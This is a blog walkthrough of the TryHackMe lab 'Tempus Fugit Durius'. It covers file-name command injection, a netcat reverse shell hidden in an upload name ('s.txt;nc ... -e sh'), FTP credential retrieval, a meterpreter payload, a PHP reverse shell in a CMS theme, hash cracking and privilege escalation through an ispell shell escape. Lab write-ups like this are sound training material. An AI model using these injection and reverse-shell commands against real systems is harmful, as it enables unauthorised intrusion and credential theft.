---
title: "Tempus Fugit Durius TryHackme Writeup 6d1587d1609d"
platform: Medium
original_file: 2024-08-27_Tempus-Fugit-Durius-TryHackme-Writeup-6d1587d1609d.md
---

# Tempus Fugit Durius TryHackme Writeup 6d1587d1609d

::: {}
# Tempus Fugit Durius TryHackme Writeup {#tempus-fugit-durius-tryhackme-writeup .p-name}
:::

::: {.section .p-summary field="subtitle"}
This is a Writeup of Tryhackme room "Tempus Fugit Durius"
:::

::::::: {.section .e-content field="body"}
:::::: {#fa29 .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### Tempus Fugit Durius TryHackme Writeup {#b467 .graf .graf--h3 .graf--leading .graf--title name="b467"}

**This is a Writeup of Tryhackme room "Tempus Fugit Durius"**

<figure id="e2cd" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*rEmrUFJccWXc-TIQ.png"
class="graf-image" data-image-id="0*rEmrUFJccWXc-TIQ.png"
data-width="542" data-height="311" data-is-featured="true" />
</figure>

**Room link:**
[https://tryhackme.com/room/tempusfugitdurius](https://tryhackme.com/room/tempusfugitdurius){.markup--anchor
.markup--p-anchor
data-href="https://tryhackme.com/room/tempusfugitdurius"
rel="noopener ugc nofollow noopener" target="_blank"}\
**Note: This room is for Premium Members Only. who purchased THM premium
membership.**

### Task 1 Harder {#f221 .graf .graf--h3 .graf-after--p name="f221"}

Tempus Fugit is a Latin phrase that roughly translated as "time flies".\
Durius is also latin and means "harder".\
This is a remake of Tempus Fugit 1. A bit harder and different from the
first one. It is an intermediate/hard, real life box.

Let's start with our **nmap** scan first:

<figure id="5196" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*9ogZXXE0-Mijb5DY.png"
class="graf-image" data-image-id="0*9ogZXXE0-Mijb5DY.png"
data-width="710" data-height="300" />
</figure>

As we can see from our output, we have 4 ports open: 22, 80, 111 and
lastly 51947. Let's start to enumerate the HTTP service:

<figure id="1884" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*1YzLfeJymIEpHYJN.png"
class="graf-image" data-image-id="0*1YzLfeJymIEpHYJN.png"
data-width="875" data-height="594" />
</figure>

The **"Upload"** link on the top of the page looks interesting. Let's
navigate on that one:

<figure id="cb62" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*08-ds4P2dKnvg4Mb.png"
class="graf-image" data-image-id="0*08-ds4P2dKnvg4Mb.png"
data-width="747" data-height="328" />
</figure>

We can see an **upload** option on the top right side. I uploaded a
shell and got an error about file types.

<figure id="cde5" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*bKNyZMeYaTMJVXu1.png"
class="graf-image" data-image-id="0*bKNyZMeYaTMJVXu1.png"
data-width="295" data-height="88" />
</figure>

Now I don't know about **txt** but **rtf** sounds a bit suspicious. I
searched for rtf **reverse shell** and got link to **RCE via rtf** files
but all the available exploits were for windows system.

### Burpsuite {#644d .graf .graf--h3 .graf-after--p name="644d"}

Then I decided to intercept the requests while submitting the form and
see if I can find something.

<figure id="b2f0" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*jS-s7NB3hAEhz6V4.png"
class="graf-image" data-image-id="0*jS-s7NB3hAEhz6V4.png"
data-width="471" data-height="122" />
</figure>

I was getting a redirect response in burp but I couldn't figure out so
[\@4nqr34z](http://twitter.com/4nqr34z){.markup--anchor
.markup--p-anchor data-href="http://twitter.com/4nqr34z"
rel="noopener ugc nofollow noopener" target="_blank"} gave me a hint. He
said **play with the file name and see the output in the browser**.

<figure id="e4ea" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*vV_R3m1eMpJLoXuq.png"
class="graf-image" data-image-id="0*vV_R3m1eMpJLoXuq.png"
data-width="875" data-height="323" />
</figure>

So I did that, I changed the name of the file as **shell.txt;id** and
sent the request and in my browser I could see output of the id command.

<figure id="182d" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*jfS-UQ85dBx0pSY-.png"
class="graf-image" data-image-id="0*jfS-UQ85dBx0pSY-.png"
data-width="875" data-height="315" />
</figure>

<figure id="3677" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*aeSVdHiyrse3O9zn.png"
class="graf-image" data-image-id="0*aeSVdHiyrse3O9zn.png"
data-width="450" data-height="130" />
</figure>

**NOTE**: if you get confused with all this burp and browser thing then
you can just do it but editing your file name and re-uploading it with
different commands. Like make a file with name **shell.txt;id** and
upload it you'll see the output. Then rename the file to
**shell.txt;ls** to see that output and so on.

Create some files like this

<figure id="a432" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*9hSeslTxAveO2q2s.png"
class="graf-image" data-image-id="0*9hSeslTxAveO2q2s.png"
data-width="403" data-height="132" />
</figure>

If we run a command like **ls -la** we'll get the following output:

<figure id="f494" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Ke8reJ6OhSCfel98.png"
class="graf-image" data-image-id="0*Ke8reJ6OhSCfel98.png"
data-width="729" data-height="270" />
</figure>

Use Ctrl+u to see better view

### Revershell {#83f3 .graf .graf--h3 .graf-after--p name="83f3"}

There are several things making revershell hard. You cannot use . \# /
and you are limited to 30 characters Converting IP to decimal helps with
both length and . problems. The payload cannot be more than 30
characters.

thats why change file name **file.txt to s.txt** to making short

<figure id="b859" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*zy33tAjF4DVmzmLh.png"
class="graf-image" data-image-id="0*zy33tAjF4DVmzmLh.png"
data-width="540" data-height="294" />
</figure>

[https://www.ultratools.com/tools/decimalCalc](https://www.ultratools.com/tools/decimalCalc){.markup--anchor
.markup--p-anchor
data-href="https://www.ultratools.com/tools/decimalCalc"
rel="noopener ugc nofollow noopener" target="_blank"}

**s.txt;nc 167906330 4444 -e sh**

<figure id="8be6" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*4ozwRHZd2TonlWf_.png"
class="graf-image" data-image-id="0*4ozwRHZd2TonlWf_.png"
data-width="491" data-height="130" />
</figure>

Now start listener

<figure id="bd4a" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*-8bduBKYOTZ5Sz-j.png"
class="graf-image" data-image-id="0*-8bduBKYOTZ5Sz-j.png"
data-width="354" data-height="112" />
</figure>

now upload your file

<figure id="04be" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*EBdvQb9zqVk0ntZw.png"
class="graf-image" data-image-id="0*EBdvQb9zqVk0ntZw.png"
data-width="644" data-height="149" />
</figure>

Here we got shell

``` {#3036 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="rust"}
python -c 'import pty;pty.spawn("/bin/bash")'
```

<figure id="4d1f" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*A_f1FzFz30KeWiUq.png"
class="graf-image" data-image-id="0*A_f1FzFz30KeWiUq.png"
data-width="495" data-height="176" />
</figure>

We got ftp user credential

<figure id="57b0" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*ysT36SV6TG9w-Z9Q.png"
class="graf-image" data-image-id="0*ysT36SV6TG9w-Z9Q.png"
data-width="762" data-height="220" />
</figure>

Its time to login into **FTP**

<figure id="52d9" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*aaU_rqGg03kpEqJD.png"
class="graf-image" data-image-id="0*aaU_rqGg03kpEqJD.png"
data-width="365" data-height="163" />
</figure>

But couldn't login

We don't have access to a FTP client, but we have python

Well, the **FTP** service is not installed on here, and we are not able
to install it. So, after a little bit of research, I found that I got
the **Python** installed on box and if I write a **Python** script, I
can access the **FTP** service:

<figure id="5fcc" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*eRQE2XpW9c5zIqsD.png"
class="graf-image" data-image-id="0*eRQE2XpW9c5zIqsD.png"
data-width="488" data-height="204" />
</figure>

now upload this **ftp.py** on machine

<figure id="8436" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*nEmRYG121h8yzvkf.png"
class="graf-image" data-image-id="0*nEmRYG121h8yzvkf.png"
data-width="827" data-height="279" />
</figure>

So, it worked! What we can see here is file on FTP share named
"creds.txt . Let's add another couple of lines to our script in order to
get "creds.txt" from the share to our computer:

<figure id="6ddf" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Y5ZmyWvmY5AiE7xQ.png"
class="graf-image" data-image-id="0*Y5ZmyWvmY5AiE7xQ.png"
data-width="518" data-height="247" />
</figure>

``` {#6dbb .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="csharp"}
#!/usr/bin/pythonfrom ftplib import FTPftp = FTP('ftp.mofo.pwn')
ftp.login('someuser', '04*************06')
ftp.retrlines('LIST')with open('creds.txt', 'wb') as fp:
    ftp.retrbinary('RETR creds.txt', fp.write)
    ftp.quit()
```

Again upload ftp.py file after edit

<figure id="62cd" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*m8GX32vb-g9foELd.png"
class="graf-image" data-image-id="0*m8GX32vb-g9foELd.png"
data-width="721" data-height="264" />
</figure>

### Recon {#65ab .graf .graf--h3 .graf-after--figure name="65ab"}

We don't have much tools on the host, so we put up a msf multi/handler
and spawn a meterpreter revershell.

**Create Revershell**

<figure id="b50c" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Hab0ro2G1FpIPWqy.png"
class="graf-image" data-image-id="0*Hab0ro2G1FpIPWqy.png"
data-width="875" data-height="135" />
</figure>

upload shell.elf on machine

<figure id="9236" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*lMVHUrsUMqRu8fxW.png"
class="graf-image" data-image-id="0*lMVHUrsUMqRu8fxW.png"
data-width="838" data-height="231" />
</figure>

**msfconsole**

<figure id="3e91" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*sgWm5Xrvk8snI9Di.png"
class="graf-image" data-image-id="0*sgWm5Xrvk8snI9Di.png"
data-width="813" data-height="386" />
</figure>

Now run **shell.elf**

<figure id="6de7" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*0m2Xx8R-uwkxdX2t.png"
class="graf-image" data-image-id="0*0m2Xx8R-uwkxdX2t.png"
data-width="342" data-height="128" />
</figure>

as we run shell.elf we got reverse shell

<figure id="d9dc" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*d9xeBvk484FuknrH.png"
class="graf-image" data-image-id="0*d9xeBvk484FuknrH.png"
data-width="831" data-height="198" />
</figure>

<figure id="3214" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*yV6byShqiH1dIb7g.png"
class="graf-image" data-image-id="0*yV6byShqiH1dIb7g.png"
data-width="405" data-height="435" />
</figure>

What we can see here is, there is another host up located in **Interface
9** with IP address **"192.168.150.10"**. At this point, we need to
escape from this container and access to the host located on **Interface
9**. In order to do that, we need to do **port forwarding:**

<figure id="a800" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*ApUGSmaBjyiI4zQx.png"
class="graf-image" data-image-id="0*ApUGSmaBjyiI4zQx.png"
data-width="619" data-height="83" />
</figure>

With above command, we created our **Local TCP relay** by forwarding
**Port 80** on **Remote Host** to our **Port 8888**. When we do this and
browse **"localhost:8888"**, we can see the same page we got initially
from **Port 80** on remote host, which is useless for us to find the
admin panel we need. At this point, we need to discover other hosts on
**"192.168.150.0/24"** **subnet**

<figure id="b6ca" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*nGA0xID6BZsaKLMR.png"
class="graf-image" data-image-id="0*nGA0xID6BZsaKLMR.png"
data-width="621" data-height="110" />
</figure>

[http://localhost:8080/](http://localhost:8080/){.markup--anchor
.markup--p-anchor data-href="http://localhost:8080/"
rel="noopener ugc nofollow" target="_blank"}

Add `127.0.0.1 newcms.mofo.pwn `{.markup--code .markup--p-code}to
/etc/hosts file

[http://newcms.mofo.pwn:8080/admin/](http://newcms.mofo.pwn:8080/admin/){.markup--anchor
.markup--p-anchor data-href="http://newcms.mofo.pwn:8080/admin/"
rel="noopener ugc nofollow noopener" target="_blank"}

<figure id="b989" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*CQXFixMISWov8WqK.png"
class="graf-image" data-image-id="0*CQXFixMISWov8WqK.png"
data-width="875" data-height="549" />
</figure>

Use admin:B\*\*\*\*\*\*\*\*\*\*\*\*G credential to login

We try editing a page, adding PHP-code to get shell

**Setting\>Theme and select hello plugin and edit**

<figure id="90b7" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Up4oHAkGE9bvkw4L.png"
class="graf-image" data-image-id="0*Up4oHAkGE9bvkw4L.png"
data-width="875" data-height="425" />
</figure>

[http://pentestmonkey.net/tools/php-reverse-shell](http://pentestmonkey.net/tools/php-reverse-shell){.markup--anchor
.markup--p-anchor
data-href="http://pentestmonkey.net/tools/php-reverse-shell"
rel="noopener ugc nofollow noopener" target="_blank"}

<figure id="8950" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*6sxepOEHMqItCltD.png"
class="graf-image" data-image-id="0*6sxepOEHMqItCltD.png"
data-width="686" data-height="566" />
</figure>

After putting my reverse-shell code on the page and when I execute it, I
get my shell:

<figure id="e956" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*0V760ZCIkRtRJsDm.png"
class="graf-image" data-image-id="0*0V760ZCIkRtRJsDm.png"
data-width="875" data-height="312" />
</figure>

<figure id="f46d" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*oHXsDkoldKeX6-yS.png"
class="graf-image" data-image-id="0*oHXsDkoldKeX6-yS.png"
data-width="577" data-height="203" />
</figure>

Finally I escaped the container and got a shell from the real machine.
Let's try to navigate to **"/home"** directory:

<figure id="ea0a" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*yU2G0Y8VnRzqcaYK.png"
class="graf-image" data-image-id="0*yU2G0Y8VnRzqcaYK.png"
data-width="284" data-height="79" />
</figure>

Well, apparently, there are two users named **"benclower** and **me"**,
but we are not privileged to access those.We can check **"/etc/passwd"**
file also. So, the first thing I did after upgrading my shell again to a
**meterpreter shell** was going to **"/tmp"** directory and copy
**"linPEAS"** from my computer:

<figure id="31be" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*lapUNJ-Td9pwgAab.png"
class="graf-image" data-image-id="0*lapUNJ-Td9pwgAab.png"
data-width="816" data-height="406" />
</figure>

<figure id="ac38" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*rbVRKKqtPm4mUzO-.png"
class="graf-image" data-image-id="0*rbVRKKqtPm4mUzO-.png"
data-width="739" data-height="257" />
</figure>

On **linPEAS** output, I saw there are some database files located in
the **"/var/www/html/inc/data/"** directory. Let's navigate to there:

<figure id="bc22" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*xB0HNwI0Rh1CuiRg.png"
class="graf-image" data-image-id="0*xB0HNwI0Rh1CuiRg.png"
data-width="519" data-height="108" />
</figure>

Download **database.sdb**

for this we need meterpreter shell

<figure id="5127" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*7j4aN8AlrjzkDxUp.png"
class="graf-image" data-image-id="0*7j4aN8AlrjzkDxUp.png"
data-width="800" data-height="325" />
</figure>

<figure id="c179" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*WvihuHphBa7uCdWO.png"
class="graf-image" data-image-id="0*WvihuHphBa7uCdWO.png"
data-width="580" data-height="409" />
</figure>

Run **shell.elf**

<figure id="5371" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*-kmmXXBfcHQL4w8d.png"
class="graf-image" data-image-id="0*-kmmXXBfcHQL4w8d.png"
data-width="665" data-height="179" />
</figure>

<figure id="2cfc" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*TypJ4lQRyxt-u2b8.png"
class="graf-image" data-image-id="0*TypJ4lQRyxt-u2b8.png"
data-width="758" data-height="185" />
</figure>

Now we got reverse shell

<figure id="5d38" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*gps7XNjWpTWU_x4e.png"
class="graf-image" data-image-id="0*gps7XNjWpTWU_x4e.png"
data-width="875" data-height="331" />
</figure>

Analyze this file with **sqlite3**

<figure id="a114" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*v_G2nBRV3wnfv1ht.png"
class="graf-image" data-image-id="0*v_G2nBRV3wnfv1ht.png"
data-width="875" data-height="354" />
</figure>

What we see here is we got the password hash of the user named **"Ben
Clower"**. After performing a brute-force either with **hashcat** or
**john** by using **rockyou.txt**, we get the password. So, what I did
was switching to **benclower**

``` {#d1e4 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="markdown"}
$2y$***********************************************FC
```

<figure id="142a" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*IVAIREKA2Wlm2oJ-.png"
class="graf-image" data-image-id="0*IVAIREKA2Wlm2oJ-.png"
data-width="545" data-height="239" />
</figure>

Now we have password of **benclower**

<figure id="685e" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*SAHSmIRgEbeyusLk.png"
class="graf-image" data-image-id="0*SAHSmIRgEbeyusLk.png"
data-width="608" data-height="384" />
</figure>

### Time to Privilege {#3ad9 .graf .graf--h3 .graf-after--figure name="3ad9"}

run linpeas.sh again discovers a unusual SGID file

<figure id="2eb7" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*SxCCe2BkqRt3EGp8.png"
class="graf-image" data-image-id="0*SxCCe2BkqRt3EGp8.png"
data-width="807" data-height="125" />
</figure>

**ispell** has a shell-escape !So running it on any file it will find
misspellings in...

``` {#8a3d .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
ispell /bin/ping
```

<figure id="00c3" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*FHxG4H4XVCkdl8kC.png"
class="graf-image" data-image-id="0*FHxG4H4XVCkdl8kC.png"
data-width="819" data-height="308" />
</figure>

We are now in user group adm.

### Root {#7ba7 .graf .graf--h3 .graf-after--p name="7ba7"}

We now can read log files. Investigating auth.log

Someone might have entered password in username.

<figure id="a911" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*TtQZZ1sdpWZ0wDRP.png"
class="graf-image" data-image-id="0*TtQZZ1sdpWZ0wDRP.png"
data-width="495" data-height="131" />
</figure>

<figure id="d70d" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*yX53IEBPej2fRdsb.png"
class="graf-image" data-image-id="0*yX53IEBPej2fRdsb.png"
data-width="875" data-height="124" />
</figure>

Seems like we got a possible password for **root.** Let's try to switch
users!!!!

<figure id="3501" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*C5TC3O36q-FEBedv.png"
class="graf-image" data-image-id="0*C5TC3O36q-FEBedv.png"
data-width="493" data-height="336" />
</figure>

### Promote and Collaborate on Cybersecurity Insights {#420d .graf .graf--h3 .graf-after--figure name="420d"}

We are excited to offer promotional opportunities and guest post
collaborations on our blog and website, focusing on all aspects of
cybersecurity. Whether you're an expert with valuable insights to share
or a business looking to reach a wider audience, our platform provides
the perfect space to showcase your knowledge and services. Let's work
together to enhance our community's understanding of cybersecurity!

### About the Author: {#c5a1 .graf .graf--h3 .graf-after--p name="c5a1"}

[Vijay
Gupta](https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2){.markup--anchor
.markup--p-anchor
data-href="https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2"
rel="noopener" target="_blank"} is a cybersecurity enthusiast with
several years of experience in cyber security, [cyber crime forensics
investigation](https://play.google.com/store/books/details?id=VRz7EAAAQBAJ){.markup--anchor
.markup--p-anchor
data-href="https://play.google.com/store/books/details?id=VRz7EAAAQBAJ"
rel="noopener ugc nofollow noopener" target="_blank"}, and security
awareness training in schools and colleges. With a passion for
safeguarding digital environments and educating others about
cybersecurity best practices, Vijay has dedicated his career to
promoting cyber safety and resilience. Stay connected with Vijay Gupta
on various social media platforms and professional networks to access
valuable insights and stay updated on the latest cybersecurity trends.
:::
::::
::::::
:::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [August 27, 2024](https://medium.com/p/6d1587d1609d).

[Canonical
link](https://medium.com/@bevijaygupta/tempus-fugit-durius-tryhackme-writeup-6d1587d1609d){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
